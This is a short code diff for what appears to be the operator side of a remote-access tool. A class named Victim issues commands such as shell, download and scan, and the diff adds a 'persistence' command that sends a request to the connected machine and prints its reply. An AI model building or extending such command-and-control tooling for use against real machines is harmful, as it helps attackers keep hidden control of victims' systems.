@@ -17,8 +17,19 @@ class Victim:
             "ping": self.__ping,
             "shell": self.__shell,
             "download": self.__download,
-            "scan": self.__scan
+            "scan": self.__scan,
+            "persistence": self.__persistence
         }
+
+    def __persistence(self) -> bool:
+        self.conn.send(b"persistence")
+        buffer = self.conn.recv()
+        if buffer:
+            # Print persistence status
+            print(buffer.decode())
+            return True
+        else:
+            return False
 
     def __ping(self) -> bool:
         self.conn.send(b"ping")
